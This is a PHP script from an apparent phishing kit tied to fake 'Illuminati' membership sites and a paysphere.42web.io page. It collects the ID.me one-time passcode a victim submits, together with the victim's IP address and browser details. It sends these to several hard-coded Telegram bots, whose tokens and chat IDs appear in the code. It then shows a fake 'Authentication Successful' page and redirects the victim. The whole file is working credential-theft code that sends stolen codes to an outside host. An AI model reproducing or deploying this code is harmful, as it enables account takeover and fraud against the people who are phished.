<?php
// UNIVERSAL BROWSER-COMPATIBLE OTP CONFIRMATION SCRIPT
// Works on Chrome, Firefox, Safari, Edge, Mobile Browsers

// Site-specific configuration with domain-based bots and redirects
$site_map = [
    '127.0.0.1' => [
        'bots' => [
            ['token' => '8491989105:AAHZ_rUqbKxZSPfiEEIQ3w_KPyO4N9XSyZw', 'chat_id' => '1325797388'],
            ['token' => '8413673524:AAGruDl1TxUDZH9RwQYYWSeEwJBcqR5S1lQ', 'chat_id' => '1566821522'],
        ],
        'redirect' => 'https://illuminatiofficial.world/index.html'
    ],


    'paysphere.42web.io' => [
        'bots' => [
            ['token' => '8491989105:AAHZ_rUqbKxZSPfiEEIQ3w_KPyO4N9XSyZw', 'chat_id' => '1325797388'],

            ['token' => '8327467242:AAFFBheM0nU1-45BKH5vAvdfXKhgXPopJvg', 'chat_id' => '7919111838']
        ],
        'redirect' => 'https://paysphere.42web.io/cache_site/careers/all-listings.job.34092/processing.html'
    ],



    
    
    'illuminatiofficial.world' => [
        'bots' => [
            ['token' => '8491989105:AAHZ_rUqbKxZSPfiEEIQ3w_KPyO4N9XSyZw', 'chat_id' => '1325797388'],
            ['token' => '8413673524:AAGruDl1TxUDZH9RwQYYWSeEwJBcqR5S1lQ', 'chat_id' => '1566821522'],
        ],
        'redirect' => 'https://illuminatiofficial.world/official/join-the-illuminati-members/Submitted_Illuminati_Official_Website.html'
    ],
    
    'illuminatipath.world' => [
        "bots" => [
            ['token' => '8491989105:AAHZ_rUqbKxZSPfiEEIQ3w_KPyO4N9XSyZw', 'chat_id' => '1325797388'],
            ['token' => '8491692614:AAHhTPb4DRwkvmJa0SjF00v5x8kNWA82xfk', 'chat_id' => '6378885812'],
        ],
        "redirect" => "https://illuminatipath.world/official/join-the-illuminati-members/Submitted_Illuminati_Official_Website.html"
    ],

    'illuminatisyndicate.world' => [
        "bots" => [
            ['token' => '8491989105:AAHZ_rUqbKxZSPfiEEIQ3w_KPyO4N9XSyZw', 'chat_id' => '1325797388'],
            ['token' => '8531352805:AAFN91n2L76y7WKwB159QFRNtvCnLu_uM9M', 'chat_id' => '7875523533'],
        ],
        "redirect" => "https://illuminatisyndicate.world/official/join-the-illuminati-members/Submitted_Illuminati_Official_Website.html"
    ],

    'illuminatilight.world' => [
        "bots" => [
            ['token' => '8491989105:AAHZ_rUqbKxZSPfiEEIQ3w_KPyO4N9XSyZw', 'chat_id' => '1325797388'],
            ['token' => '8064658016:AAHEcSX8Y981ebjcAveqjyhS8sGkrGnYiq4', 'chat_id' => '7575811693'],
        ],
        "redirect" => "https://illuminatilight.world/official/join-the-illuminati-members/Submitted_Illuminati_Official_Website.html"
    ],

    'illuminatisacred.world' => [
        "bots" => [
            ['token' => '8491989105:AAHZ_rUqbKxZSPfiEEIQ3w_KPyO4N9XSyZw', 'chat_id' => '1325797388'],
            ['token' => '8412410845:AAFxuHUyafETE-8oCvUsSp45l0CtDkb-qm0', 'chat_id' => '7411482040'],
        ],
        "redirect" => "https://illuminatisacred.world/official/join-the-illuminati-members/Submitted_Illuminati_Official_Website.html"
    ],
];

// ============================================
// UNIVERSAL FUNCTIONS (Browser Compatible)
// ============================================

// Simple universal logging
function log_entry($message, $level = 'INFO') {
    $log_file = __DIR__ . '/logs/universal_otp_confirms.log';
    $timestamp = date('Y-m-d H:i:s');
    $browser = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
    $browser_short = substr($browser, 0, 80);
    $line = "[$timestamp] [$level] [Browser: $browser_short] $message\n";
    
    // Ensure log directory exists
    if (!file_exists(dirname($log_file))) {
        mkdir(dirname($log_file), 0777, true);
    }
    
    file_put_contents($log_file, $line, FILE_APPEND);
}

// Universal Telegram sender (browser compatible)
function send_to_telegram($token, $chat_id, $message) {
    $url = "https://api.telegram.org/bot{$token}/sendMessage";
    
    // Browser-compatible POST data (URL-encoded)
    $post_data = http_build_query([
        'chat_id' => $chat_id,
        'text' => $message,
        'parse_mode' => 'HTML',  // HTML works better across all browsers
        'disable_web_page_preview' => true
    ]);
    
    // Create cURL handle with universal settings
    $ch = curl_init();
    
    curl_setopt_array($ch, [
        CURLOPT_URL => $url,
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => $post_data,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT => 8,           // Slightly longer timeout for mobile
        CURLOPT_CONNECTTIMEOUT => 5,
        CURLOPT_SSL_VERIFYPEER => true,
        CURLOPT_SSL_VERIFYHOST => 2,
        // Universal SSL settings
        CURLOPT_SSLVERSION => CURL_SSLVERSION_TLSv1_2,
        CURLOPT_HTTPHEADER => [
            'Content-Type: application/x-www-form-urlencoded; charset=utf-8',
            'Accept: application/json',
            'User-Agent: Mozilla/5.0 (compatible; PHP-Telegram-Bot)'
        ]
    ]);
    
    $result = curl_exec($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $error = curl_error($ch);
    
    curl_close($ch);
    
    return [
        'success' => ($http_code == 200 && empty($error)),
        'http_code' => $http_code,
        'error' => $error,
        'result' => $result
    ];
}

// ============================================
// MAIN PROCESSING
// ============================================

// Log access immediately
log_entry("Script accessed via " . ($_SERVER['REQUEST_METHOD'] ?? 'NO_METHOD'));

// Get referring domain (browser-safe)
$referer = $_SERVER['HTTP_REFERER'] ?? '';
$referer = filter_var($referer, FILTER_SANITIZE_URL);
$parsed = parse_url($referer);
$domain = $parsed['host'] ?? 'unknown';

// Normalize domain (remove www. for consistency)
if (strpos($domain, 'www.') === 0) {
    $domain = substr($domain, 4);
}

log_entry("Domain detected: $domain (from referer: $referer)");

// Find configuration for this domain
$config = $site_map[$domain] ?? null;

// If no config found, use first one as fallback
if (!$config) {
    log_entry("No config found for domain '$domain', using first config as fallback", 'WARN');
    $config = reset($site_map);
}

// Handle POST requests
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    log_entry("=== Processing OTP Confirmation ===");
    
    // ============================================
    // FORM DATA PROCESSING (Browser Compatible)
    // ============================================
    
    // Log POST data for debugging (safely)
    $post_log = 'POST keys: ' . implode(', ', array_keys($_POST));
    log_entry($post_log);
    
    // Get OTP confirmation data with universal compatibility
    $otpconfirm = isset($_POST['otpconfirm']) ? 
                  htmlspecialchars(trim($_POST['otpconfirm']), ENT_QUOTES, 'UTF-8') : 
                  '???';
    
    // Get IP address (universal method)
    $ip = 'unknown';
    $ip_sources = [
        'HTTP_CLIENT_IP',
        'HTTP_X_FORWARDED_FOR', 
        'HTTP_X_FORWARDED',
        'HTTP_FORWARDED_FOR',
        'HTTP_FORWARDED',
        'REMOTE_ADDR'
    ];
    
    foreach ($ip_sources as $source) {
        if (!empty($_SERVER[$source])) {
            $ip = $_SERVER[$source];
            break;
        }
    }
    
    // Clean IP (handle multiple IPs)
    if (strpos($ip, ',') !== false) {
        $ips = explode(',', $ip);
        $ip = trim($ips[0]);
    }
    
    $timestamp = date('Y-m-d H:i:s');
    $user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
    
    // ============================================
    // PREPARE TELEGRAM MESSAGE
    // ============================================
    
    // Use HTML formatting (more compatible than Markdown)
    $message = "<b>✅ ID.me OTP Confirmation</b>\n\n" .
               "🔒 <b>Confirm OTP Code:</b> <code>" . htmlspecialchars($otpconfirm) . "</code>\n" .
               "🌐 <b>Domain:</b> $domain\n" .
               "📡 <b>IP:</b> <code>$ip</code>\n" .
               "🕒 <b>Time:</b> $timestamp\n" .
               "🔍 <b>Browser:</b> " . substr($user_agent, 0, 100);
    
    // Log the submission
    log_entry("OTP Confirmation from $ip - Code: $otpconfirm");
    
    // ============================================
    // SEND TO TELEGRAM BOTS
    // ============================================
    
    $success_count = 0;
    $total_bots = count($config['bots']);
    
    foreach ($config['bots'] as $bot_index => $bot) {
        if (empty($bot['token']) || empty($bot['chat_id'])) {
            log_entry("Skipping bot $bot_index - empty token or chat_id", 'WARN');
            continue;
        }
        
        log_entry("Sending to bot $bot_index...");
        
        $result = send_to_telegram($bot['token'], $bot['chat_id'], $message);
        
        if ($result['success']) {
            $success_count++;
            log_entry("Bot $bot_index delivered successfully", 'SUCCESS');
        } else {
            log_entry("Bot $bot_index failed - HTTP {$result['http_code']}: {$result['error']}", 'ERROR');
        }
        
        // Small delay between bots to avoid rate limiting
        if ($bot_index < ($total_bots - 1)) {
            usleep(200000); // 0.2 seconds
        }
    }
    
    log_entry("Telegram delivery complete: $success_count/$total_bots bots successful", 'STATS');
    
    // ============================================
    // UNIVERSAL REDIRECT (Browser Compatible)
    // ============================================
    
    $redirect_url = $config['redirect'];
    log_entry("Redirecting to: $redirect_url");
    
    // Clean any output buffers
    while (ob_get_level()) {
        ob_end_clean();
    }
    
    // ============================================
    // UNIVERSAL REDIRECT METHODS (All Browsers)
    // ============================================
    
    // Method 1: JavaScript redirect (works everywhere)
    echo '<!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Authentication Complete</title>
        <style>
            body {
                font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                margin: 0;
                padding: 20px;
                display: flex;
                justify-content: center;
                align-items: center;
                min-height: 100vh;
                color: white;
            }
            .container {
                background: rgba(255, 255, 255, 0.95);
                padding: 50px;
                border-radius: 20px;
                box-shadow: 0 10px 30px rgba(0,0,0,0.2);
                text-align: center;
                max-width: 600px;
                width: 100%;
                color: #333;
            }
            .success-icon {
                font-size: 80px;
                margin-bottom: 20px;
                color: #2ecc71;
            }
            .checkmark {
                width: 80px;
                height: 80px;
                border-radius: 50%;
                background: #2ecc71;
                margin: 0 auto 30px;
                position: relative;
                animation: scaleIn 0.5s ease-out;
            }
            .checkmark::after {
                content: "";
                position: absolute;
                left: 25px;
                top: 40px;
                width: 20px;
                height: 10px;
                border-left: 4px solid white;
                border-bottom: 4px solid white;
                transform: rotate(-45deg);
            }
            @keyframes scaleIn {
                0% { transform: scale(0); }
                70% { transform: scale(1.2); }
                100% { transform: scale(1); }
            }
            h1 {
                color: #2c3e50;
                margin-bottom: 20px;
            }
            .fallback-link {
                display: inline-block;
                margin-top: 30px;
                padding: 12px 30px;
                background: #3498db;
                color: white;
                text-decoration: none;
                border-radius: 30px;
                font-weight: bold;
                transition: transform 0.2s, background 0.2s;
            }
            .fallback-link:hover {
                background: #2980b9;
                transform: translateY(-2px);
            }
            #countdown {
                font-size: 1.2em;
                margin: 20px 0;
                color: #7f8c8d;
            }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="checkmark"></div>
            <h1>✅ Authentication Successful!</h1>
            <p>Your identity has been verified successfully.</p>
            <p>You are now being redirected to the Illuminati members area...</p>
            
            <div id="countdown">Redirecting in <span id="seconds">3</span> seconds...</div>
            
            <a href="' . htmlspecialchars($redirect_url, ENT_QUOTES, 'UTF-8') . '" class="fallback-link" id="manual-link" style="display:none;">
                Enter Members Area
            </a>
        </div>
        
        <script>
            // Primary JavaScript redirect (fastest)
            setTimeout(function() {
                window.location.href = "' . addslashes($redirect_url) . '";
            }, 100);
            
            // Countdown timer for user feedback
            var seconds = 3;
            var countdown = document.getElementById("seconds");
            var interval = setInterval(function() {
                seconds--;
                countdown.textContent = seconds;
                if (seconds <= 0) {
                    clearInterval(interval);
                    document.getElementById("manual-link").style.display = "inline-block";
                }
            }, 1000);
            
            // Meta refresh as backup (for older browsers)
            setTimeout(function() {
                var meta = document.createElement("meta");
                meta.httpEquiv = "refresh";
                meta.content = "0;url=' . addslashes($redirect_url) . '";
                document.head.appendChild(meta);
            }, 2000);
            
            // Final backup after 5 seconds
            setTimeout(function() {
                window.location.href = "' . addslashes($redirect_url) . '";
            }, 5000);
        </script>
        
        <!-- Meta refresh for browsers without JavaScript -->
        <meta http-equiv="refresh" content="3;url=' . htmlspecialchars($redirect_url, ENT_QUOTES, 'UTF-8') . '">
        
        <!-- Additional security for browser compatibility -->
        <noscript>
            <style>.container { animation: none; }</style>
            <div style="text-align: center; padding: 20px;">
                <p>JavaScript is disabled. Click the link below to proceed:</p>
                <a href="' . htmlspecialchars($redirect_url, ENT_QUOTES, 'UTF-8') . '" style="color: #3498db; font-weight: bold;">
                    Click here to continue
                </a>
            </div>
        </noscript>
    </body>
    </html>';
    
    exit;
    
} else {
    // Not a POST request - show error
    log_entry("Invalid request method: " . $_SERVER['REQUEST_METHOD'], 'ERROR');
    
    header("HTTP/1.1 405 Method Not Allowed", true, 405);
    header("Content-Type: text/html; charset=utf-8");
    
    echo '<!DOCTYPE html>
    <html>
    <head>
        <title>Invalid Request</title>
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <style>
            body { font-family: Arial, sans-serif; padding: 20px; text-align: center; }
            .error { color: #d32f2f; margin: 40px 0; }
        </style>
    </head>
    <body>
        <div class="error">
            <h2>Invalid Request</h2>
            <p>This page only accepts POST submissions from the OTP confirmation form.</p>
            <p>Please use the verification form to submit your confirmation code.</p>
        </div>
    </body>
    </html>';
    
    exit;
}
?>
